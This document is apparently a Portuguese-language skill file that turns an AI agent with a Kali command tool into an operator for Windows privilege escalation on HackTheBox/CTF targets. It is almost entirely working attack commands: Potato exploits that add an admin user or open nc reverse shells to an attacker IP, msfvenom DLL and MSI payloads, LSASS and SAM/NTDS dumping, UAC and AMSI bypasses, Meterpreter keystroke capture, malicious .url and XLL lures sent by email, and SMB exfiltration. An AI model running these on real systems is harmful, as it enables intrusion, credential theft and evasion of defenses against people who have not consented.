---
name: htb-privesc-windows
description: Use esta skill quando o usuário tiver um shell de baixo privilégio em Windows de HackTheBox/CTF e precisar escalar para SYSTEM ou Administrator, mencionando "privesc windows", "SYSTEM", "token", "SeImpersonate", "SeBackupPrivilege", "SeDebugPrivilege", "SeManageVolume", "DLL hijack", "service", "UAC", "winpeas", "DPAPI", "GPO abuse", "RunasCs", "malicious shortcut", "XLL", "keystroke capture", "Snort DLL", "StandaloneRunner", "AMSI bypass", "AlwaysInstallElevated", ou quiser ir de usuário comum para SYSTEM.
argument-hint: [ip-alvo]
allowed-tools: [mcp__mcp-kali-server__execute_command]
---

# HTB PrivEsc Windows — Windows Privilege Escalation

Baseado em +200 write-ups do 0xdf (https://0xdf.gitlab.io/) cobrindo 2018-2026.

## Passo 0 — Contexto inicial

```powershell
whoami
whoami /priv          # CRÍTICO: verificar privileges
whoami /groups        # grupos — Backup Operators? GPO Managers?
net user %username%
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
hostname
```

## Passo 1 — Token Privileges (prioridade máxima)

Use `execute_command` para `whoami /priv` e identificar:

### SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege → SYSTEM garantido:
```powershell
# GodPotato (Windows 10/11 + Server 2012-2022)
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
.\GodPotato-NET4.exe -cmd "cmd /c net user hacker P@ss123 /add && net localgroup administrators hacker /add"
.\GodPotato-NET4.exe -cmd "cmd /c C:\Windows\Temp\nc.exe <KALI_IP> 4444 -e cmd.exe"

# PrintSpoofer (Server 2016/2019)
.\PrintSpoofer64.exe -c "cmd /c whoami" -i
.\PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe <KALI_IP> 4444 -e cmd.exe" -i

# JuicyPotatoNG
.\JuicyPotatoNG.exe -t * -p cmd.exe -a "/c whoami"

# Named Pipe Impersonation via NtObjectManager (HTB DarkZero)
# PowerShell com SMB redirect para recuperar token
Import-Module NtObjectManager
$token = Get-NtToken -Duplicate -TokenType Primary
```

### SeManageVolumePrivilege (HTB DarkZero):
```powershell
# SeManageVolumeExploit — modifica ACL de volumes
# Muda permissões de Administrators para Users em arquivos do sistema
.\SeManageVolumeExploit.exe
# Depois: escrever DLL maliciosa em system32 ou modificar arquivo de configuração
```

### SeBackupPrivilege (HTB Rebound, Freelancer):
```powershell
# Dump de registry hives (sem VSS)
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
reg save HKLM\SECURITY C:\Temp\SECURITY

# Criar VSS e copiar NTDS.dit
$s = [WScript.Shell]
diskshadow /s C:\Temp\shadow.txt
# Conteúdo de shadow.txt:
# set context persistent nowriters
# add volume c: alias 0xdf
# create
# expose %0xdf% z:

# Robocopy com /b (bypass access control)
robocopy /b Z:\Windows\NTDS\ntds.dit C:\Temp\ntds.dit

# Dump no Kali
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

### SeDebugPrivilege:
```powershell
# Dump do LSASS via ProcDump
.\procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp
# Ou via Task Manager → Create Dump File

# No Kali:
pypykatz lsa minidump lsass.dmp

# Migrar para processo SYSTEM via Meterpreter (HTB Analysis)
# Metasploit: use exploit/multi/handler
# migrate <winlogon.exe PID>

# psgetsys.ps1 — executar como processo parent (HTB POV)
ImpersonateFromParentPid -ppid 548 -command "cmd.exe" -cmdargs "/c whoami > C:\Temp\out.txt"
```

## Passo 2 — WinPEAS

```bash
# Servir do Kali
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe -O /tmp/winpeas.exe
python3 -m http.server 8888 -d /tmp/
```

```powershell
# No alvo
certutil.exe -urlcache -split -f "http://<KALI_IP>:8888/winpeas.exe" C:\Temp\winpeas.exe
.\winpeas.exe
```

**Focar em:** Interesting Files, Services misconfigurations, Scheduled Tasks, Registry, DPAPI

## Passo 3 — Serviços mal configurados

```powershell
# Binário substituível
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows"
# Verificar ACL do executável:
icacls "C:\Program Files\VulnService\service.exe"
# Se (F) ou (W) para nosso user: substituir por payload

# Unquoted Service Path
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
# Criar: C:\Program.exe se path = C:\Program Files\App\service.exe

# Permissões fracas no registry
reg query HKLM\SYSTEM\CurrentControlSet\Services\VulnService
# Se tiver write: mudar ImagePath

# accesschk para auditoria completa
.\accesschk.exe /accepteula -uwcqv "Authenticated Users" *
.\accesschk.exe /accepteula -uwcqv "Everyone" *
```

## Passo 4 — Grupos privilegiados

### Backup Operators:
```powershell
# Ver Passo 1 — SeBackupPrivilege
# Ou usar wbadmin para backup do AD:
wbadmin start backup -quiet -backuptarget:\\<KALI_IP>\share -include:c:\windows\ntds
```

### GPO Managers (HTB Office):
```powershell
# SharpGPOAbuse
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <USER> --GPOName "Default Domain Policy"
gpupdate /force
```

### Print Operators:
```powershell
# Carregar driver malicioso (SeLoadDriverPrivilege via grupo)
```

## Passo 5 — DPAPI — Credenciais criptografadas

```powershell
# Localizar credenciais armazenadas
cmdkey /list
dir %APPDATA%\Microsoft\Credentials\ /a
dir %APPDATA%\Microsoft\Protect\ /a  # Master keys

# Listar com PowerShell
Get-ChildItem -Path "$env:APPDATA\Microsoft\Credentials\" -Force

# Descriptografar via BackupKey RPC (HTB Freelancer/Analysis)
.\mimikatz.exe "dpapi::masterkey /in:C:\Users\<USER>\AppData\Roaming\Microsoft\Protect\<SID>\<GUID> /rpc" "exit"

# Via impacket no Kali (com credenciais do usuário ou hash)
dpapi.py masterkey -file <MASTERKEY> -target <USER> -dc-ip <DC_IP> \
  -u <USER> -p <PASS>
dpapi.py credential -file <CRED_FILE> -key <MASTERKEY>
```

## Passo 6 — DLL Hijacking

```powershell
# Identificar DLLs faltando (Process Monitor / winPEAS / resultado manual)
# Verificar aplicações em paths com permissão de escrita

# Criar DLL maliciosa no Kali
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f dll -o malicious.dll

# Colocar no diretório correto com nome da DLL esperada
copy .\malicious.dll "C:\path\to\missing.dll"

# Snort DLL injection (HTB Analysis):
# C:\Snort\lib\snort_dynamicpreprocessor\ — writable!
# Gerar DLL e aguardar Snort service reload (executado a cada ~2 min pares)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f dll -a x64 -o evil.dll
copy evil.dll "C:\Snort\lib\snort_dynamicpreprocessor\sf_evil.dll"
```

## Passo 7 — AlwaysInstallElevated

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Se ambos = 0x1:
```
```bash
# Kali: gerar MSI malicioso
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f msi -o shell.msi
```
```powershell
msiexec /quiet /qn /i C:\Temp\shell.msi
```

## Passo 8 — UAC Bypass

```powershell
# Fodhelper (Windows 10 1703+)
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /d "" /f
fodhelper.exe

# Eventvwr
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d "cmd.exe" /f
eventvwr.exe

# Limpar registro depois
reg delete "HKCU\Software\Classes\ms-settings" /f
```

## Passo 9 — Credenciais em texto claro / registro

```powershell
# AutoLogon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
# DefaultUserName, DefaultPassword, DefaultDomainName

# Busca ampla
reg query HKLM /f password /t REG_SZ /s 2>nul | findstr /i "password"
reg query HKCU /f password /t REG_SZ /s 2>nul | findstr /i "password"

# Arquivos de configuração
type C:\inetpub\wwwroot\web.config 2>nul
type C:\xampp\htdocs\config.php 2>nul
findstr /si password *.xml *.ini *.txt *.config 2>nul

# PowerShell history (CRÍTICO — HTB Timelapse)
type C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Serviço com credenciais em argumentos (HTB Sendai)
reg query HKLM\SYSTEM\CurrentControlSet\Services\helpdesk /v ImagePath
# Pode conter: C:\helpdesk.exe -u clifford.davey -p Password123!

# Scheduled tasks com credenciais
schtasks /query /fo LIST /v | findstr /i "pass\|user\|run as"
```

## Passo 10 — Técnicas de entrega de payload (Windows)

### RunasCs (execução como outro usuário):
```powershell
# Executar como usuário diferente com credenciais
.\RunasCs.exe username password cmd -r <KALI_IP>:<PORT>
.\RunasCs.exe username password powershell -r <KALI_IP>:<PORT>

# Com UAC bypass
.\RunasCs.exe username password cmd --bypass-uac --logon-type 5 -r <KALI_IP>:<PORT>
```

### Malicious Shortcut (.url/.lnk) — HTB Axlle, Mist:
```bash
# Criar .url malicioso no Kali
cat > evil.url << 'EOF'
[InternetShortcut]
URL=http://test.com
WorkingDirectory=C:\
IconFile=C:\Windows\System32\shell32.dll
IconIndex=0
EOF
# No campo URL colocar:
# URL=file:///<KALI_IP>/share (captura NTLM hash via Responder)
# Ou
# URL=powershell.exe -enc <BASE64_PAYLOAD>
```

```powershell
# Copiar para diretório monitorado por admin
copy evil.url "C:\inetpub\testing\"
copy evil.url "C:\Common Applications\"
```

### Malicious XLL Excel Add-in (HTB Axlle):
```bash
# No Kali: criar com msfvenom (simulação)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f raw > shell.bin
# Ou compilar com Visual Studio + Excel SDK 2013 (função xlAutoOpen)

# Enviar por email com swaks
swaks --to target@domain.htb --from attacker@domain.htb \
  --attach invoice.xll --server <SMTP_IP>
```

### StandaloneRunner LOLBIN (HTB Axlle):
```powershell
# Roda como SYSTEM automaticamente
# Diretório: C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\
# Criar estrutura:
mkdir working
echo "command_to_run" > command.txt
echo "ProjectName" > reboot.rsf
# Adicionar "True" no rsf → executa command.txt como SYSTEM
```

## Passo 11 — AMSI / Defender Bypass

```powershell
# Renaming de variáveis (HTB Mist) — bypass de assinaturas
# Trocar nomes previsíveis: $client → $c, $stream → $s, etc.

# Checar exclusões do Defender
Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" |
  Where-Object {$_.Id -eq 5007} | Select-Object -Last 20

# Identificar diretórios excluídos
.\MpCmdRun.exe -Scan -ScanType 3 -File C:\Temp\test.txt
Get-MpPreference | Select-Object ExclusionPath

# Disable AMSI (se admin local)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Powershell execution bypass
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -EncodedCommand <BASE64>
```

## Passo 12 — Keystroke Capture / RDP Credential Visibility

```powershell
# Via Meterpreter com SeDebugPrivilege (HTB Hospital)
# Migrar para explorer.exe de sessão interativa
# migrate <PID_explorer>
# keyscan_start
# keyscan_dump

# RDP: clique no ícone de olho em campos de senha
# Credenciais em scripts de scheduled tasks (SyncAppvPublicationServer.vbs)
type "C:\Windows\SysWOW64\SyncAppvPublicationServer.vbs"
```

## Passo 13 — CVEs de Windows

```powershell
systeminfo | findstr /B /C:"OS Version"
wmic qfe list brief
```

| CVE | Afeta | Técnica |
|-----|-------|---------|
| CVE-2021-1675 / CVE-2021-34527 | Print Spooler | PrintNightmare — DLL maliciosa como driver |
| CVE-2021-36934 | Win10 1809+ HiveNightmare | `icacls C:\Windows\System32\config\SAM` → users podem ler |
| CVE-2023-2640 + CVE-2023-32629 | Ubuntu WSL/VMs | GameOverlay (ver privesc-linux) |
| CVE-2023-29360 | Windows 11/2022 | token impersonation |
| CVE-2024-30088 | Windows Kernel | escalação via kernel |

```powershell
# HiveNightmare — ler SAM sem admin
icacls C:\Windows\System32\config\SAM
# Se "Users:(I)(RX)" → vssadmin para copiar shadow
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\
```

## Passo 14 — Impacket SMB exfiltration

```bash
# Servir SMB share do Kali para receber/enviar arquivos
smbserver.py share /tmp/share -smb2support

# No Windows:
copy C:\Temp\file.txt \\<KALI_IP>\share\
```

## Checklist de PrivEsc Windows

```
[ ] whoami /priv → SeImpersonate → GodPotato
[ ] whoami /priv → SeBackupPrivilege → dump SAM/NTDS
[ ] whoami /priv → SeDebugPrivilege → procdump lsass / migrate
[ ] whoami /priv → SeManageVolume → SeManageVolumeExploit
[ ] whoami /groups → Backup Operators, GPO Managers, Print Operators
[ ] cmdkey /list → RunasC com credenciais salvas
[ ] reg query Winlogon → AutoLogon credentials
[ ] PowerShell history → ConsoleHost_history.txt
[ ] reg query HKLM\...\Services\ → credenciais em ImagePath
[ ] wmic service → unquoted path, binary hijack
[ ] reg query AlwaysInstallElevated → MSI exploit
[ ] winPEAS → varredura completa
[ ] DPAPI: %APPDATA%\Microsoft\Credentials\ + masterkeys
[ ] Snort/services: DLLs em diretórios writeable
[ ] Scheduled tasks com scripts editáveis
[ ] .url/.lnk em diretórios monitorados por admin
```
